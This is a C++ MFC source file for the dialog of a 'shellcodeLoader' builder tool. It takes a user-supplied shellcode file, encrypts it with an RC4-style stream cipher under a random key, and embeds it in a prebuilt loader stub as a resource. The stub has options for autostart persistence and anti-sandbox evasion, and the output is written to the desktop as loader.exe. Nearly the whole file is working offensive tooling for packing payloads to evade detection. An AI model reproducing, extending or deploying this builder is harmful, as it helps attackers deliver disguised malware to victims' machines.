
// shellcodeLoaderDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "shellcodeLoader.h"
#include "shellcodeLoaderDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CshellcodeLoaderDlg 对话框



CshellcodeLoaderDlg::CshellcodeLoaderDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_SHELLCODELOADER_DIALOG, pParent)
	, ShellcodePath(_T(""))
	, bool_x64(FALSE)
	, bool_autostart(FALSE)
	, bool_antisandbox(FALSE)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CshellcodeLoaderDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_PATH, ShellcodePath);
	DDV_MaxChars(pDX, ShellcodePath, 255);
	DDX_Check(pDX, IDC_X64, bool_x64);
	DDX_Check(pDX, IDC_AUTOSTART, bool_autostart);
	DDX_Check(pDX, IDC_ANTISANDBOX, bool_antisandbox);
	DDX_Control(pDX, IDC_METHOD, Method);
}

BEGIN_MESSAGE_MAP(CshellcodeLoaderDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_DROPFILES()
	ON_BN_CLICKED(IDC_GENERATE, &CshellcodeLoaderDlg::OnBnClickedGenerate)
	ON_BN_CLICKED(IDC_X64, &CshellcodeLoaderDlg::OnBnClickedX64)
END_MESSAGE_MAP()



BOOL CshellcodeLoaderDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();
	SetIcon(m_hIcon, TRUE);			
	SetIcon(m_hIcon, FALSE);	
	WIN32_FIND_DATA wfd = { 0 };
	HANDLE fhnd = FindFirstFile(_T("DATA\\32\\*.DAT"), &wfd);
	if (fhnd == INVALID_HANDLE_VALUE)
	{
		FindClose(fhnd);
		return TRUE;
	}
	BOOL bRet = TRUE;
	while (bRet)
	{
		CString filename = wfd.cFileName;
		Method.AddString(filename.Left(filename.ReverseFind(_T('.'))));
		bRet = FindNextFile(fhnd, &wfd);
	}
	FindClose(fhnd);
	Method.SetCurSel(0);
	return TRUE; 
}



void CshellcodeLoaderDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); 
		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

HCURSOR CshellcodeLoaderDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CshellcodeLoaderDlg::StreamCrypt(unsigned char* Data, unsigned long Length, unsigned char* Key, unsigned long KeyLength)
{
	int i = 0, j = 0;
	unsigned char k[256] = { 0 }, s[256] = { 0 };
	unsigned char tmp = 0;
	for (i = 0; i < 256; i++)
	{
		s[i] = i;
		k[i] = Key[i%KeyLength];
	}
	for (i = 0; i < 256; i++)
	{
		j = (j + s[i] + k[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
	}
	int t = 0;
	i = 0, j = 0, tmp = 0;
	unsigned long l = 0;
	for (l = 0; l < Length; l++)
	{
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
		t = (s[i] + s[j]) % 256;
		Data[l] ^= s[t];
	}
}

void CshellcodeLoaderDlg::OnBnClickedGenerate()
{

	UpdateData(TRUE);
	if (ShellcodePath.IsEmpty())
	{
		AfxMessageBox(_T("Please drag in a shellcode file first(.bin)"));
		return;
	}
	CONFIG config = { 0 };
	config.autostart = bool_autostart;
	config.antisandbox = bool_antisandbox;
	srand(time(0));
	for (int i = 0; i < 128; i++)
	{
		memset(&config.key[i], rand() % 0xFF, 1);
	}
	CString method,srcpath;
	Method.GetWindowTextW(method);
	if (bool_x64)
	{
		srcpath = _T("DATA\\64\\") + method + _T(".DAT");
	}
	else
	{
		srcpath= _T("DATA\\32\\") + method + _T(".DAT");
	}
	wchar_t filepath[MAX_PATH] = { 0 };
	SHGetSpecialFolderPath(0, filepath, CSIDL_DESKTOPDIRECTORY, 0);
	StrCatW(filepath, _T("\\loader.exe"));
	if (CopyFile(srcpath,filepath,FALSE)==0)
	{
		AfxMessageBox(_T("Build loader failed"));
		return;
	}
	HANDLE hShellcode = CreateFile(ShellcodePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hShellcode == INVALID_HANDLE_VALUE)
	{
		AfxMessageBox(_T("Shellcode file occupied!"));
		CloseHandle(hShellcode);
		return;
	}
	int shellcodeSize = GetFileSize(hShellcode, NULL);
	PBYTE shellcode = (PBYTE)malloc(shellcodeSize + sizeof(config));
	memcpy(shellcode, &config, sizeof(CONFIG));
	DWORD lpNumberOfBytesRead;
	ReadFile(hShellcode, shellcode + sizeof(CONFIG), shellcodeSize, &lpNumberOfBytesRead, NULL);
	StreamCrypt(shellcode + sizeof(CONFIG), shellcodeSize, config.key,128);
	HANDLE  hResource = BeginUpdateResource(filepath, FALSE);
	if (NULL != hResource)
	{
		if (UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(100), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)shellcode, shellcodeSize + sizeof(config)) != FALSE)
		{
			AfxMessageBox(_T("Generated successfully"));
			EndUpdateResource(hResource, FALSE);
		}
	}
	free(shellcode);
	CloseHandle(hShellcode);
	return;
}


void CshellcodeLoaderDlg::OnDropFiles(HDROP hDropInfo)
{
	wchar_t pFilePath[256] = { 0 };
	DragQueryFile(hDropInfo, 0, pFilePath, 256);
	ShellcodePath.Format(_T("%s"), pFilePath);
	UpdateData(false);
	CDialogEx::OnDropFiles(hDropInfo);
}


void CshellcodeLoaderDlg::OnBnClickedX64()
{
	UpdateData(TRUE);
	Method.ResetContent();
	WIN32_FIND_DATA wfd = { 0 };
	HANDLE fhnd = INVALID_HANDLE_VALUE;
	if (bool_x64)
	{
		fhnd = FindFirstFile(_T("DATA\\64\\*.DAT"), &wfd);
	}
	else
	{
		fhnd = FindFirstFile(_T("DATA\\32\\*.DAT"), &wfd);
	}
	if (fhnd == INVALID_HANDLE_VALUE)
	{
		FindClose(fhnd);
		return;
	}
	BOOL bRet = TRUE;
	while (bRet)
	{
		CString filename = wfd.cFileName;
		Method.AddString(filename.Left(filename.ReverseFind(_T('.'))));
		bRet = FindNextFile(fhnd, &wfd);
	}
	FindClose(fhnd);
	Method.SetCurSel(0);
}
